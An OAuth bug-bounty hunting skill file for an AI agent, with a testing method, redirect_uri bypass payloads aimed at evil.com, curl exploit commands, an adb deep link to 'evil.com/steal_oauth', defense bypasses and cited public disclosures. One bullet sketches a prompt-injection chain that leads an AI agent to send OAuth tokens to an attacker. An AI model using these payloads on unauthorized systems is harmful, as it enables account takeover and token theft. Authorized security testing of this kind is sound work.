---
name: hunt-oauth
description: Hunting skill for oauth vulnerabilities. Built from 19 public bug bounty
  reports. Use when hunting oauth on any target.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: github, hackerone_public, salt_labs, descope, detectify_labs, harel_research
report_count: 22
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Crown Jewel Targets

OAuth vulnerabilities are among the highest-value bug classes in web security because they directly enable **account takeover, session theft, and authentication bypass** — the trifecta that programs pay most for.

**Highest-value targets:**
- **Consumer identity providers** (Google, Facebook, PayPal, Apple SSO integrations) — any compromise cascades across all relying parties
- **Mobile apps with custom deep link OAuth handlers** — Android/iOS intent handling is notoriously loose
- **Multi-tenant SaaS platforms** (GitLab, Reddit-scale apps) where one OAuth flaw hits millions of accounts
- **Gaming/entertainment platforms** with federated login (Rockstar, Oculus) — often security-immature teams
- **Enterprise SSO connectors** — critical infrastructure, high severity payouts

**Asset types that pay most:**
- OAuth authorization endpoints (`/oauth/authorize`, `/connect/authorize`)
- Token exchange endpoints (`/oauth/token`)
- Mobile deep link handlers (`push_notification_webview`, custom scheme URIs)
- Social login callback handlers (`/auth/callback`, `/oauth/callback`)

**Typical payouts:** $500–$20,000+ depending on program; account takeover findings often hit max bounty.

---

## Attack Surface Signals

### URL Patterns to Hunt
```
/oauth/authorize
/oauth/token
/connect/authorize
/auth/callback
/oauth/callback
/login?redirect_uri=
/signin?next=
/auth?return_to=
/oauth/redirect
/push_notification_webview
```

### Response Headers That Signal OAuth
```
Location: https://accounts.example.com/oauth/...
Set-Cookie: oauth_state=
WWW-Authenticate: Bearer
Content-Type: application/json (with access_token in body)
```

### JavaScript Patterns (grep in JS bundles)
```javascript
redirect_uri
client_id
response_type=code
response_type=token
state=
nonce=
oauth_token
access_token
push_notification_webview
deeplink
intent://
```

### Tech Stack Signals
- Android apps with `intent-filter` in `AndroidManifest.xml` handling `http://` or custom scheme URIs
- Apps using Doorkeeper, OmniAuth, Devise (Ruby), Passport.js (Node), Spring Security OAuth
- Social login buttons (Google, Facebook, Apple) = OAuth surface guaranteed
- `.well-known/openid-configuration` present = full OIDC surface available

---

## Step-by-Step Hunting Methodology

1. **Enumerate all OAuth entry points**
   - Spider the app for `/oauth`, `/connect`, `/auth`, `/login` paths
   - Check `.well-known/openid-configuration` and `.well-known/oauth-authorization-server`
   - Decompile mobile APKs: `apktool d app.apk` and grep for `redirect_uri`, `intent://`, deep link schemes

2. **Map the full OAuth flow**
   - Capture the authorization request: note `client_id`, `redirect_uri`, `state`, `nonce`, `response_type`
   - Capture the callback: note where tokens/codes land, what validates state/nonce

3. **Test `redirect_uri` validation (highest yield)**
   - Try exact host bypass: `redirect_uri=https://legit.com.evil.com`
   - Try path traversal: `redirect_uri=https://legit.com/callback/../../../evil`
   - Try open redirects on the legitimate domain first, then chain into OAuth
   - Try parameter pollution: `redirect_uri=https://legit.com&redirect_uri=https://evil.com`
   - Try encoded characters: `%2F`, `%40`, `%23` to confuse parsers

4. **Test `state` parameter (CSRF)**
   - Remove `state` entirely — does the flow complete?
   - Reuse a fixed `state` value across sessions
   - Check if `state` is validated server-side or only client-side

5. **Test `nonce` parameter (replay/bypass)**
   - Capture a nonce from one flow, attempt to replay it in another
   - Check if nonce is validated after token exchange
   - Test if nonce can be extracted via referrer leak (step 9)

6. **Test authentication step completeness**
   - For multi-step auth (e.g., email verification + OAuth): can you skip to `/oauth/token` directly?
   - Check if partial auth state (unverified email) is accepted by the token endpoint

7. **Hunt referrer leakage**
   - After OAuth callback with tokens in URL fragment or query, check if any on-page resources (images, scripts, iframes) receive the full `Referer` header
   - Look specifically at language switchers, analytics calls, social share buttons triggered post-auth

8. **Test mobile deep links**
   - For Android: craft malicious intent URIs that redirect the OAuth webview to attacker-controlled URLs
   - Check if deep link handlers validate the origin/host before loading
   - Test `push_notification_webview` patterns that accept arbitrary URLs

9. **Test misconfigured client credentials**
   - Check if `client_secret` appears in JS bundles or APK resources
   - Test if token endpoint accepts arbitrary `redirect_uri` values when combined with leaked `client_id`/`client_secret`

10. **Verify and document**
    - Confirm state is not validated → CSRF to account link
    - Confirm token lands on attacker domain → session theft
    - Confirm email verification skippable → auth bypass
    - Run Gate 0 check before reporting

---

## Payload & Detection Patterns

### redirect_uri Bypass Payloads
```
# Host confusion
https://evil.com#legit.com
https://legit.com.evil.com
https://legit.com@evil.com

# Path traversal
https://legit.com/oauth/callback/../../redirect?url=https://evil.com

# Open redirect chain (find open redirect on legit domain first)
https://legit.com/logout?next=https://evil.com

# Parameter pollution
?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb

# URL encoded slashes
https://legit.com%2F@evil.com
https://legit.com%252F..%252F..evil.com
```

### State CSRF Test
```bash
# Step 1: Initiate OAuth flow, capture state value
# Step 2: Drop request, use attacker account's link with victim's session
curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"

# Step 3: Force victim to visit callback with attacker's code + fixed state
https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
```

### Nonce Extraction via Referrer
```bash
# After OAuth callback landing page, check outbound requests
# Look for Referer header containing access_token or code
curl -v "https://target.com/auth/callback?code=ABC&state=XYZ" \
  -H "Referer: https://evil.com" \
  --max-redirs 0

# Grep JS for outbound calls made on callback page
grep -r "fetch\|XMLHttpRequest\|img.src\|script.src" callback_page.html
```

### Mobile Deep Link Exploit (Android)
```bash
# ADB exploit for push_notification_webview deeplink
adb shell am start -a android.intent.action.VIEW \
  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"

# Craft intent URI for web-based exploit
<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
```

### Token Endpoint Auth Bypass
```bash
# Test unauthenticated token exchange (skip email verification)
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=CAPTURED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "redirect_uri=https://legit.com/callback"

# Test with unverified account credentials
curl -X POST https://target.com/oauth/token \
  -d "grant_type=password" \
  -d "username=unverified@evil.com" \
  -d "password=password123" \
  -d "client_id=CLIENT_ID"
```

### Grep Patterns for Recon
```bash
# In APK/JS files
grep -r "redirect_uri\|client_secret\|oauth_token\|access_token\|push_notification" .
grep -r "intent://\|deeplink\|scheme://" .

# In Burp history
# Filter: URL contains "oauth" OR "token" OR "callback"
# Filter: Response contains "access_token" OR "code=" in Location header

# Check .well-known
curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
```

### OIDC Discovery & Dynamic Registration Abuse
```bash
# Enumerate OIDC endpoints (esp. registration_endpoint)
curl -s https://idp/.well-known/openid-configuration | jq '{authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint, response_types_supported}'

# If registration_endpoint is open, register a malicious client with attacker redirect_uri
curl -X POST https://idp/connect/register \
  -H "Content-Type: application/json" \
  -d '{"client_name":"legit-app","redirect_uris":["https://attacker/cb"]}'
```

### Cross-Client Token Confusion
```bash
# Mint token for client A, attempt replay on client B's API
TOKEN=$(curl -s https://idp/oauth/token \
  -d "code=$AUTH_CODE&client_id=CLIENT_A&client_secret=SECRET_A&redirect_uri=https://app-a.com/cb" | jq -r .access_token)

# Test if client B's API accepts the token (no audience validation)
curl https://api.app-b.com/admin -H "Authorization: Bearer $TOKEN"
```

### OIDC prompt=none Silent Re-Auth Test
```bash
# Test whether adding prompt=none to authorize request yields a token without user interaction
# Signals session fixation / silent auth abuse potential
curl -v "https://idp/authorize?client_id=APP&redirect_uri=https://app/cb&response_type=code&state=XYZ&prompt=none"
```

---

## Common Root Causes

1. **Weak `redirect_uri` validation** — developers whitelist by prefix (`startsWith`) rather than exact match, or whitelist an entire domain instead of specific paths. A sub-path open redirect on the same domain then becomes a full token theft primitive.

2. **Missing or unvalidated `state` parameter** — developers implement OAuth by following basic tutorials that omit CSRF protection, or validate state client-side only in JavaScript (easily bypassed).

3. **Nonce not validated post-exchange** — nonce is generated and sent in the request but never verified against the ID token after the code exchange, making replay attacks possible.

4. **Authentication step ordering not enforced server-side** — teams implement multi-step auth (signup → email verify → OAuth grant) but don't enforce the sequence server-side. The token endpoint doesn't check completion of prerequisite steps.

5. **Token/code in URL with outbound requests on callback page** — developers land users on a callback page with tokens in the query string, then that page fires analytics, social share, or CDN requests that leak the full URL via `Referer` header.

6. **Mobile deep link handlers trust all input URLs** — Android/iOS developers build webview wrappers for push notification flows without validating that the loaded URL belongs to their own domain.

7. **Misconfigured OAuth application registration** — developers register wildcard redirect URIs (`https://*.example.com/*`) or don't restrict them at all during development and forget to lock down for production.

8. **Client secrets embedded in mobile apps** — treating confidential client credentials as public, enabling an attacker with the secret to perform token requests with arbitrary redirect URIs.

9. **OIDC `sub` claim ambiguity across identity providers** — apps accepting login from multiple IdPs (Google, Microsoft, Apple) may key accounts on `sub` alone without IdP isolation. If two IdPs emit the same `sub` for different users, one IdP's attacker hijacks accounts linked to the other IdP.

---

## Bypass Techniques

### Defender: Exact-match `redirect_uri` whitelist
**Bypass:** Find an open redirect on the whitelisted domain itself, then use that URL as the redirect_uri. The OAuth server validates the registered domain ✓, but the open redirect bounces the code/token to attacker.
```
redirect_uri=https://legit.com/logout?next=https://evil.com
```

### Defender: `state` parameter required
**Bypass:** Check if state is validated for *length/format* but not *binding to session*. Use a fixed predictable state value. Also check if PKCE is enforced — if not, the state check alone is insufficient for code injection.

### Defender: Fragment-only token delivery (`response_type=token`)
**Bypass:** Fragment isn't sent in `Referer` by browsers, but JavaScript on the callback page may read `window.location.hash` and pass it to analytics or postMessage to a parent frame. Intercept postMessage handlers.

### Defender: Host validation on mobile deep links
**Bypass:** Try URL encoding (`https%3A//evil.com`), double encoding, Unicode normalization, or null bytes to confuse the validator while the underlying webview still navigates correctly.

### Defender: Short-lived authorization codes
**Bypass:** Referrer leakage and open redirects work even with short-lived codes if the attacker has a fast receiver. For CSRF, the victim completes the flow so timing is less critical.

### Defender: PKCE enforcement
**Bypass:** Check if PKCE is required for *all* clients or only specific ones. Legacy clients or mobile apps may be exempt. Test with `code_challenge` omitted — if the server still issues tokens, PKCE isn't enforced.

### Defender: Nonce validation
**Bypass:** Check if nonce is validated client-side in JavaScript only. Intercept and modify the ID token's nonce claim if the signature isn't verified (rare but seen in misconfigured implementations). Also test if nonce is validated on *initial* request but not on token refresh.

---

## Gate 0 Validation

Before writing the report, answer all three:

**1. What can the attacker DO right now?**
Be specific: "I can send victim a crafted URL → victim clicks → their OAuth code redirects to my server → I exchange code for access token → I am now logged in as victim." If you can't complete this full chain, it may be informational only.

**2. What does the victim LOSE?**
Minimum bar: victim loses authenticated session (account access). Higher bars: victim loses linked accounts, payment methods, private data. If the attacker only learns the victim's identity without gaining access, severity drops significantly.

**3. Can it be reproduced in 10 minutes from scratch?**
Open a fresh browser/device with no prior state. If you can walk from "unauthenticated" to "authenticated as victim" in 10 minutes using only your written steps, the bug is real and reportable. If it requires lucky timing, specific victim behavior beyond "click a link," or network position, document those dependencies explicitly.

---

## Real Impact Examples

### Scenario 1: Mobile Session Theft via Push Notification Deep Link (PayPal/Venmo pattern)
An attacker discovers that the Android app's push notification handler accepts an arbitrary `url` parameter in its deep link scheme without validating the host. The attacker crafts a malicious URL using the app's custom scheme pointing to their own server. When sent to a victim (via social engineering or a compromised push notification channel), the app opens a WebView navigating to the attacker's server — which then initiates an OAuth flow and captures the OAuth token as it's returned to the "callback" now under attacker control. Result: full account takeover on a payments platform affecting millions of users. Business impact: unauthorized fund transfers, exposure of linked payment methods and transaction history.

### Scenario 2: Email Verification Bypass via Direct Token Endpoint Access (GitLab pattern)
A developer creates an account with an unverified email address. Normally the platform blocks full access until email is verified. However, the `/oauth/token` endpoint performs no verification status check — it only validates credentials. The attacker calls `/oauth/token` directly with valid (unverified) credentials and receives a fully-scoped OAuth token. This token passes all downstream authorization checks. Result: complete authentication bypass, allowing unverified/disposable email accounts to gain full platform access, undermining the email verification security control entirely. At scale on a platform like GitLab, this affects CI/CD pipeline access, repository access, and API usage.

### Scenario 3: OAuth Token Theft via Referrer Header on Language Change (Rockstar Games pattern)
The OAuth callback page for Facebook login lands users at a URL containing the `access_token` in the query string. The page includes a language-switcher widget that makes a GET request to change locale preferences. This GET request includes the full page URL as a `Referer` header — containing the Facebook access token. An attacker who can read server logs (or who compromises the language-change endpoint, or who is a malicious advertiser with pixel access) harvests Facebook OAuth tokens from Referer logs. Result: the attacker can authenticate to the victim's Facebook account and any other service accepting that Facebook token, constituting a cross-platform account takeover. Business impact: GDPR/privacy violation, cross-service account compromise, potential regulatory liability.

---

## Disclosed Report Citations (Backfill +9 — 2020-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 10 internal references. Each is a distinct OAuth subclass with a working PoC documented in the cited writeup.

11. **Semrush — IDN-homograph redirect_uri bypass** ([H1 #861940](https://hackerone.com/reports/861940))
    - Subclass: `redirect_uri` bypass via Unicode-confusable host (homograph)
    - Payload: `redirect_uri=https://oauth.šemrush.com/cb` (punycode `xn--emrush-9jb.com`) — passed Latin-only string check on validator
    - Root cause: server validates `redirect_uri` host as ASCII-string equality but does not normalize Unicode → confusables → punycode before compare
    - Disclosure: 2020, public bounty (amount not disclosed); discoverer Yassine Aboukir

12. **Bohemia Interactive — redirect_uri filter bypass (BiStudio)** ([H1 #405100](https://hackerone.com/reports/405100))
    - Subclass: `redirect_uri` validation bypass → OAuth token exfiltration
    - Payload: redirect_uri crafted to defeat the regex/prefix filter and land tokens on attacker host; reporter chained the bypass to a full token-leak PoC
    - Root cause: weak redirect_uri filter that accepted attacker-controlled host while still matching the intended pattern
    - Year: 2018-disclosed; remains a canonical example of regex-redirect_uri-bypass cited in subsequent reports

13. **pixiv — path-traversal in OAuth `redirect_uri`** ([H1 #1861974](https://hackerone.com/reports/1861974))
    - Subclass: path-traversal `redirect_uri` bypass → authorization-code leakage
    - Payload: `redirect_uri=https://legit.pixiv.host/legit/../../attacker/cb` — server normalized after validation
    - Root cause: validator inspected raw string; downstream HTTP/browser handled `../` traversal and emitted code to attacker path
    - Disclosure: 2023, **$2,000 bounty**, 244 upvotes — confirmed paid

14. **Slack — OAuth2 redirect_uri bypass (domain-suffix)** ([H1 #2575](https://hackerone.com/reports/2575))
    - Subclass: `redirect_uri` validation bypass via domain-suffix / subdomain confusion
    - Payload: redirect_uri using a domain that suffix-matched the registered host (e.g., `slack.com.attacker.com`) defeated the suffix-only check
    - Root cause: `endsWith()` / suffix-match instead of strict host equality
    - Disclosure: 2013 (foundational case still cited in modern OAuth training material) — Slack public bounty

15. **Booking.com (Facebook social-login)** ([Salt Labs writeup](https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com))
    - Subclass: three-step chain — open-redirect on whitelisted domain + redirect_uri bypass + `response_type` swap → Facebook OAuth code/token theft → ATO
    - Payload: authorize URL with `redirect_uri=https://account.booking.com/<open-redirect>?next=https://attacker.tld/cb` and `response_type` toggled to leak tokens via fragment
    - Root cause: validator trusted any path under `account.booking.com`; open redirect on that host bounced the auth code to attacker
    - Disclosure: March 2023 — coordinated disclosure, no public bounty figure (~500M MAU exposure)

16. **Expo.io (`expo-auth-session`) — CVE-2023-28131** ([Salt Labs writeup](https://salt.security/blog/a-new-oauth-vulnerability-that-may-impact-hundreds-of-online-services))
    - Subclass: scope-creep / unvalidated `returnUrl` parameter → cross-app OAuth-code theft (impacts every consumer of expo-auth-session social login)
    - Payload: attacker passes `returnUrl=https://attacker.tld` to the OAuth proxy → Expo blindly forwards Facebook/Google/Apple/Twitter code to attacker
    - Root cause: framework-level OAuth proxy did not validate `returnUrl` host before forwarding the social-IdP callback
    - Disclosure: May 2023; CVSS 9.6; fixed Feb 2023 hotfix + deprecated by Feb 26 2023

17. **Microsoft Azure AD multi-tenant — "nOAuth"** ([Descope writeup](https://www.descope.com/blog/post/noauth))
    - Subclass: cross-IdP account-takeover via unverified, mutable `email` claim ("Pass-The-Token" equivalent)
    - Payload: attacker sets Azure AD admin profile `mail` attribute to victim's address → clicks "Log in with Microsoft" on relying party that keys users by email claim → instant ATO
    - Root cause: Microsoft `email` claim is mutable + unverified; RPs treated it as primary identifier
    - Disclosure: April 11 2023 reported, fixed June 20 2023 (mitigations + new `xms_edov` claim)

18. **Grammarly / Vidio / Bukalapak — "Pass-The-Token" social-login** ([Salt Labs writeup](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts))
    - Subclass: missing audience / `aud` validation on Facebook access_token → cross-client token replay → ATO
    - Payload: attacker obtains Facebook token issued for `attacker.app` → replays the token to Grammarly/Vidio/Bukalapak login API → server fetches FB user via `/me`, finds victim's email, issues victim session
    - Root cause: relying party calls Facebook `/me` with attacker-issued token but never validates the token's `app_id` belongs to the RP
    - Disclosure: October 2023 — coordinated, ~1B account exposure across the three sites

19. **Zoom — OAuth "dirty dancing" chained ATO** ([Harel Security writeup](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html))
    - Subclass: `response_type=token` swap + lax `postMessage` origin check + cookie-tossing → authorization-code leak via web_message response mode → ATO + cam/mic hijack
    - Payload: attacker page opens Zoom OAuth with `response_type=code&response_mode=web_message`, intercepts the resulting `postMessage` because window listener accepts any `*.zoom.us` origin → exchanges code for session
    - Root cause: combination of weak postMessage origin check, missing CSRF binding on `state`, and `response_mode=web_message` returning code to a parent window without exact-origin enforcement
    - Disclosure: reported Oct 2023, fixed Jan 2024, **$15,000 bounty** (Sudi / BrunoZero / H4R3L)

20. **Detectify Labs — "Dirty Dancing" multi-vendor OAuth token leakage** ([Detectify writeup, F. Rosén](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/))
    - Subclass: response-type switching + invalid-state quirks + 3rd-party JS gadget chains → OAuth code/token leakage with NO XSS required
    - Payload: attacker forces `response_type=token` on an endpoint that only validated `code`; combines with promiscuous postMessage listeners and URL-storage gadgets on the callback page to siphon tokens via cross-origin reads
    - Root cause: OAuth server tolerates response_type downgrade/swap; callback page leaks `window.location` via permissive postMessage receivers
    - Disclosure: July 2022 — multi-vendor (Apple, Microsoft, Slack et al.); PortSwigger Top 10 Web Hacks 2022 #1

---

## Browser-parse vs server-parse — redirect_uri prefix-match bypass shapes

A server-side prefix-match flaw on `redirect_uri` is **necessary but not sufficient** to land the OAuth code on the attacker. The server check passing is one gate; the browser actually navigating cross-origin is another. They behave differently. Always confirm both before writing the finding as a chain → ATO.

| Server `redirect_uri` validator | Attack URL | Server `startswith()` | Browser actual host | Exploit? |
|---|---|---|---|---|
| prefix = `https://acme.example` (no slash) | `https://acme.example@evil.com/cb` | passes | evil.com (per WHATWG URL parsing — `@` is the userinfo delimiter, BEFORE the first `/` after `://`) | **YES** |
| prefix = `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/cb` | passes | **acme.example** (the `@` is now AFTER the first `/`, so WHATWG parses it as a path character) | **NO** — browser stays on acme.example |
| prefix = `https://acme.example` (substring match) | `https://acme.example.evil.com/cb` | passes | acme.example.evil.com (subdomain extension — the `.evil.com` extends the host) | **YES** |
| prefix = `https://acme.example/` (trailing slash, server normalizes `..`) | `https://acme.example/../../@evil.com/cb` | passes raw startswith | acme.example (server normalizes path; even if it didn't, browser path-normalizes too) | usually **NO** |
| prefix = `https://acme.example/` (Chromium-specific) | `https://acme.example/\@evil.com/cb` | passes | host depends — Chromium converts `\` to `/` so this becomes `https://acme.example//@evil.com/cb` and stays on acme.example | usually **NO** |

**Operational rule:** the WHATWG URL parser (used by all modern browsers since 2018) does userinfo parsing ONLY in the authority section — i.e., **before the first `/` after `://`**. Once the path begins, `@` is just a character. Server-side string-startswith checks don't model this — they pass URLs the browser will then route to the legitimate host.

**Always headless-test (Playwright / Puppeteer / a real browser) the final navigation BEFORE writing the OAuth finding as ATO-chain.** Server-side accept + browser-side stay-on-legitimate-host = **not** ATO. Verified live in `docs/verification/phase3-playwright-browser-execution.md` Test 29.

---

## Related Skills & Chains

- **`hunt-subdomain`** — The single highest-impact OAuth chain. Chain primitive: OAuth `redirect_uri` validator accepts any `*.target.com` subdomain + recon reveals `dev-staging.target.com` CNAMEs to a deprovisioned Heroku/S3/Azure app → claim the dangling subdomain → host an OAuth callback receiver there → craft `/oauth/authorize?redirect_uri=https://dev-staging.target.com/cb` → victim clicks → auth code lands on attacker-claimed subdomain → exchange for token → ATO. The redirect_uri whitelist passed because the subdomain is "legitimately" under target.com control.
- **`hunt-ato`** — OAuth state-CSRF is the textbook ATO-via-account-linking primitive. Chain primitive: `state` parameter absent or not session-bound + victim is already logged into target.com + attacker initiates OAuth flow from their own account, captures `code` before exchange + crafts callback URL with attacker's code → forces victim to visit → victim's target.com session is now linked to attacker's Google/Facebook identity → attacker logs in via Google → owns victim's account.
- **`hunt-llm-ai`** — Modern OAuth flows for AI agents (ChatGPT plugins, Claude MCP servers, agentic copilots) reuse OAuth 2.1 + PKCE. Chain primitive: agentic AI accepts `redirect_uri` from indirect prompt-injection in a document → model crafts OAuth authorize URL with attacker callback → user clicks "approve" thinking it's the agent's own flow → tokens exfiltrated via tool-use to attacker domain.
- **`hunt-saml`** — When OAuth is layered atop a SAML IdP, the IdP-level XSW becomes the OAuth ATO path. Chain primitive: SAML SP that issues OAuth tokens after assertion-validation + XSW attack on the assertion alters `NameID` to admin user → SP issues OAuth token bearing admin identity → OAuth-scoped APIs grant admin access.
- **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host-confusion `legit.com@evil.com`, `legit.com.evil.com`, path-traversal, parameter pollution, encoded-slash `%2F`, fragment-injection `#legit.com`) and the open-redirect chain catalog when exact-match validation forces you to find an open-redirect on the whitelisted domain first.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an OAuth "open redirect" that doesn't actually leak a token (only the `state` param, or the callback page doesn't include credentials in URL). State-only leakage is Low; token/code leakage with successful exchange demonstration is Critical. The exchange-the-code step is non-negotiable.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
